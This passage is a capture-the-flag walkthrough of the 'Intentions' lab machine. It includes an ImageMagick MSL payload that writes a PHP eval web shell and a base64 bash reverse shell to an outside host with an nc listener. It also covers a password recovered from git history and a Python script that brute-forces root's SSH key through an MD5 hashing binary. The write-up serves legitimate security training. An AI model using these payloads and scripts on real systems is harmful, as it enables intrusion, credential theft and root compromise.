token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3MjkzMDIzLCJleHAiOjE2OTczMTQ2MjMsIm5iZiI6MTY5NzI5MzAyMywianRpIjoiMzhnTmMxRGtIZ0lQREJGcSIsInN1YiI6IjIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.HBdW-t5hCQ8e71PJp04u0FfkDBZoduAtVY7Pp9BmWsE
```

On the front page there seems to be a pretty big hint about what service is being used to modify pictures in the background. there is a link to the manual page of imagemagick.

![ImageMagick hint](/assets/Intentions_3.png)

https://www.php.net/manual/en/class.imagick.php


After googling around a little for vulnerabilities with this library i stumbled upon the following blog showing a way to gain remote code execution using the MSL format

https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/


To put it in short  some vulnerabilities were found in ImageMagick's MSL format. it is possible to write files by suplying a specifically crafted msl file. I created the following MSL file to create a very basic command injection payload in php. this command injection is then written to 
**/var/www/html/intentions/public/calico.php**
```
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @eval(@$_REQUEST['a']); ?&gt;" />
 <write filename="info:/var/www/html/intentions/public/calico.php" />
</image>
```
Then using the following curl request we were able to upload this file which will then create our command execution php page.

```
curl -X POST  -x http://127.0.0.1:8080  -H "Accept: application/json, text/plain, */*" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "X-Requested-With: XMLHttpRequest" -H "Content-Type: multipart/form-data" -H "X-Requested-With: XMLHttpRequest " -H "X-XSRF-TOKEN: eyJpdiI6IkN2KzNHdEllcndva1JRVjdLR1ZNMEE9PSIsInZhbHVlIjoiYy9wbzQxWnhKVndEVzNVR0k3RVhJbmNJT01SYkJDcktpQTJ2cHRlYXpzMHVUN2RhTDBwY09kQ2w3cG9tSDVDU09XVHZUZ3R2SnIvTis0SUxPNjhZR2VTM3JUZnY0cjlMQklZNlJmWUFGd2pCSUFBeTVXNUhTSjJ4dWllR0x3dHIiLCJtYWMiOiI3NzllMTFmYTZhNDNjZGM3MTZhM2ZhZTQ4MWU1MjM2NmU3NjhhOTVlNzg5YWI0ZjU5ZTBhMmU4ZmMxNDYxZjg4IiwidGFnIjoiIn0="  --cookie "XSRF-TOKEN=eyJpdiI6IkN2KzNHdEllcndva1JRVjdLR1ZNMEE9PSIsInZhbHVlIjoiYy9wbzQxWnhKVndEVzNVR0k3RVhJbmNJT01SYkJDcktpQTJ2cHRlYXpzMHVUN2RhTDBwY09kQ2w3cG9tSDVDU09XVHZUZ3R2SnIvTis0SUxPNjhZR2VTM3JUZnY0cjlMQklZNlJmWUFGd2pCSUFBeTVXNUhTSjJ4dWllR0x3dHIiLCJtYWMiOiI3NzllMTFmYTZhNDNjZGM3MTZhM2ZhZTQ4MWU1MjM2NmU3NjhhOTVlNzg5YWI0ZjU5ZTBhMmU4ZmMxNDYxZjg4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImFUYlZoSldPWWF6WW1wLytEOE8zSFE9PSIsInZhbHVlIjoiZ2NIV00zNlFTY29Rd2pseWpleXBnMDlWUE5qK3NSVjF5ZmVERVFYaTdpSU5RNDg3d1JyV0RQNmhta1EzSlFxYzdqQ0tpRndKVE5XRUZtUWp4TmUzdTFwMTZZaCtkS0hZa1BjaHI5NkhJM3duOXkvdEM4bGVSUittZjZ1SXBPUXciLCJtYWMiOiJhYjZhNmU2N2YxYjk1YTNlMWIyMDRiODkzODM0MTAwOWZkMTcwODBkOTc0MTdmY2RmNDUyYmU0ZGY3Y2RkZWEwIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3MjkzMDIzLCJleHAiOjE2OTczMTQ2MjMsIm5iZiI6MTY5NzI5MzAyMywianRpIjoiMzhnTmMxRGtIZ0lQREJGcSIsInN1YiI6IjIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.HBdW-t5hCQ8e71PJp04u0FfkDBZoduAtVY7Pp9BmWsE" -F 'effect="charcoal"' -F 'path=vid:msl:/tmp/php*' -F 'exec=@test.msl' http://10.10.11.220/api/v2/admin/image/modify
```

This request will give an error gateway timed out. this is normal because the function does not return an image anymore instead it writes our file. Next we browse to the following url to execute a whoami command to prove that we have system code execution.

```
http://10.10.11.220/calico.php?a=system("whoami");
```
![Code Execution](/assets/Intentions_4.png)

Great we have code execution. But lets upgrade this to a full reverse shell next. Usually when dealing with command execution through a url i base64 my reverse shell to have less issues with syntax. 

```
echo -n '/bin/bash -l > /dev/tcp/10.10.14.72/443 0<&1 2>&1' | base64

```

this command gave us the following B64 encoded string 
```
L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNzIvNDQzIDA8JjEgMj4mMQ==
```

Then using this B64 string our payload will look like this:

```
echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNzIvNDQzIDA8JjEgMj4mMQ== | base64 --decode | bash
```

Before executing this don't forget to turn on your listener

```
nc -lvp 443
```
![Reverse shell](/assets/Intentions_5.png)

So now we have a reverse shell as www-data its time to escalate this to user privileges.  After looking around i noticed that there was a .git folder with multiple commits present. When i tried to view these i was getting errors that this folder wasn't trusted and www-data was not able to view these files. Next i then archived the entire .git folder into a tarball and placed in the public part of the web application so i could easily download it.

```
tar -cvf public/Calico.tar .git
```

Next i downloaded the tar from the following URL:

```
http://10.10.11.220/Calico.tar
```

then un-archived it be patient because its a large amount of small files:

```
tar xf Calico.tar
```

Then after extracting you need to run the git log command to show all commits that happened in this project. if this errors out saying its not a safe directory you have to run the command it suggests first
```
git log                                          
commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -> master)
Author: steve <steve@intentions.htb>
Date:   Mon Jan 30 15:29:12 2023 +0100

    Fix webpack for production

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
Author: greg <greg@intentions.htb>
Date:   Wed Jan 25 20:45:12 2023 +0100

    Adding test cases for the API!

commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd
Author: steve <steve@intentions.htb>
Date:   Fri Jan 20 14:19:32 2023 +0100

    Initial v2 commit
```

Looking at the descriptions of these commits the second one seems promising. They mention they were using a local database before which could mean that local credentials would be present there. next i checked the changes that happened in that specific commit.

```
git show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
index f57e37b..0586d51 100644
--- a/tests/Feature/Helper.php
+++ b/tests/Feature/Helper.php
@@ -8,12 +8,14 @@ class Helper extends TestCase
 {
     public static function getToken($test, $admin = false) {
         if($admin) {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->admin()->create();
         } 
         else {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->create();
         }
+        
+        $token = Auth::login($user);
+        $user->delete();
+        return $token;
     }
 }
```

There we can see that greg's password is **Gr3g1sTh3B3stDev3l0per!1998!**

Next we want to check if these credentials are valid for SSH as well and in this case they were giving us access to the machine as Greg

```
ssh greg@10.10.11.220
```
![SSH as Greg](/assets/Intentions_6.png)

# Privesc

After doing the basic enumeration a non standard binary file popped up owned by root and the scanner group. Then i checked and our user Greg is part of the scanner group allowing him to execute this binary as well.

```
cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,steven
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:steven
floppy:x:25:
tape:x:26:
sudo:x:27:steven
audio:x:29:
dip:x:30:steven
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:steven
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
messagebus:x:104:
systemd-timesync:x:105:
input:x:106:
sgx:x:107:
kvm:x:108:
render:x:109:
lxd:x:110:steven
_ssh:x:111:
crontab:x:112:
syslog:x:113:
uuidd:x:114:
tcpdump:x:115:
tss:x:116:
landscape:x:117:
steven:x:1000:
fwupd-refresh:x:118:
mysql:x:119:
ssl-cert:x:120:
ftp:x:121:
greg:x:1001:
netdev:x:122:
legal:x:1002:
scanner:x:1003:greg,legal
_laurel:x:998:
```
here the permission on the binary this means that this binary can touch files owned by root while being executed by our user greg
```
greg@intentions:/opt/scanner$ ls -hal
total 1.4M
drwxr-x--- 2 root scanner 4.0K Jun 19 11:26 .
drwxr-xr-x 3 root root    4.0K Jun 10 15:14 ..
-rwxr-x--- 1 root scanner 1.4M Jun 19 11:18 scanner
greg@intentions:/opt/scanner$ 
```

So lets look deeper into this binary I started by running the -h behind it hoping it has a help function which it did.

```
./scanner -h
flag needs an argument: -h
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

	This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
	This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
	File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

	The hash blacklist file should be maintained as a single LABEL:MD5 per line.
	Please avoid using extra colons in the label as that is not currently supported.

	Expected output:
	1. Empty if no matches found
	2. A line for every match, example:
		[+] {LABEL} matches {FILE}

  -c string
    	Path to image file to check. Cannot be combined with -d
  -d string
    	Path to image directory to check. Cannot be combined with -c
  -h string
    	Path to colon separated hash file. Not compatible with -p
  -l int
    	Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p	[Debug] Print calculated file hash. Only compatible with -c
  -s string
    	Specific hash to check against. Not compatible with -h
```

So looking at the help function the binary is used to create MD5 hash  of files to check them if they aren't causing any copyright issues. The interesting part of this binary is that we can select the amount of bytes which would allow us to brute force a file one character at a time. First we'd need to find a file worth stealing owned by root, the first thing that comes to mind is an SSH key so i tried to verify its existance by running the following command 

```
/opt/scanner/scanner -c /root/.ssh/id_rsa -s 0 -p
```
![Proof SSH key exists](/assets/Intentions_7.png)

So this proved that the SSH key does indeed exist next i wanted to see if i could take the hash of just one byte. I tried this with the following command:

```
/opt/scanner/scanner -c /root/.ssh/id_rsa -s 0 -p -l 1
```
![Extracting one Character](/assets/Intentions_8.png)

Knowing we can select the length of the file we can then just brute force this by calculating the hashes ourselves. To do this automated i created a python script and will go over it step by step.

The full code of the script is here:
```
#!/usr/bin/env python3

import hashlib
import os
import string

file_to_brute = "/root/.ssh/id_rsa"
charset = string.printable
current_read = ""

def find_char(temp_hash):
    for i in charset:
        test_data = current_read + i
        current_hash = hashlib.md5(test_data.encode()).hexdigest()
        if temp_hash == current_hash:
            return i
    return None

def get_hash(i):
    temp_hash = os.popen(f"/opt/scanner/scanner -c {file_to_brute} -s 0 -p -l {i}").read().split(" ")[-1].rstrip()
    return temp_hash

i = 1
while True:
    temp_hash = get_hash(i)
    new_char = find_char(temp_hash)
    if not new_char:
        break
    else:
        current_read += new_char
        i += 1

print("FINAL FILE:")
print(current_read)
```

After running the script we will be presented with the private SSH key of the root user

![Extracting the file](/assets/Intentions_9.png)

Save this text to a file and use it to log into the machine as root using ssh 

![Access as root](/assets/Intentions_10.png)



## Detailed overview code

### Variables
First up we setup some variables we'll need later down the line.
- **file_to_brute** is the full path of the file we want to try and retrieve.
- **charset** is the set of characters we will be using for our brutforcing. I chose for string.printable because an SSH key does not have any unpritable characters so checking for those would be a waste of time.
- **current_read** variable is a placeholder variable we will use to store the file we're brute forcing.

```
file_to_brute = "/root/.ssh/id_rsa"
charset = string.printable
current_read = ""
```

### get_hash function

The get hash function is as the name sugests the function we use to obtain the hash of the file we want to extract. This function will get looped through each time increasing the amount (i) of bytes we want to retrieve. The scanner binary would output the data as the following:  [DEBUG] /root/.ssh/id_rsa has hash 336d5ebc5436534e61d16e63ddfca327 
This data is not usable so i added the **.split(" ")[-1].rstrip()** parameters at the end to only use the last part of the string containing the hash. This hash will then be returned back to the main function.
 
```
def get_hash(i):
    temp_hash = os.popen(f"/opt/scanner/scanner -c {file_to_brute} -s 0 -p -l {i}").read().split(" ")[-1].rstrip()
    return temp_hash
```


### find_char function

So in the previous function we obtained the hash of the file with a specific length. in this function we'll try to brute force what those characters are. We will loop through every letter in our character set to try and find the right character. Each time we add the next letter in the character set to our already verified amount of bytes of data. Then we'll make an MD5 hash of this combination, if the hash matches it will break out of the loop returning the value it found. If it didn't match it will keep retrying till it finds the right printable character.


```
def find_char(temp_hash):
    for i in charset:
        test_data = current_read + i
        current_hash = hashlib.md5(test_data.encode()).hexdigest()
        if temp_hash == current_hash:
            return i
    return None
```
### main loop 

The main loop uses the previously explained functions to automate the brute forcing of the file. First it runs the get_hash function using our incrementing counter to always take one byte more per loop. next it feeds that hash value into the find_char function to brute force this specific character. Each time it finds a new character it adds it to the current_read variable slowly building up the entire file. If it doesn't find a new character anymore it means the file is finished and we can output the results.

```
i = 1
while True:
    temp_hash = get_hash(i)
    new_char = find_char(temp_hash)
    if not new_char:
        break
    else:
        current_read += new_char
        i += 1

print("FINAL FILE:")
print(current_read)
```

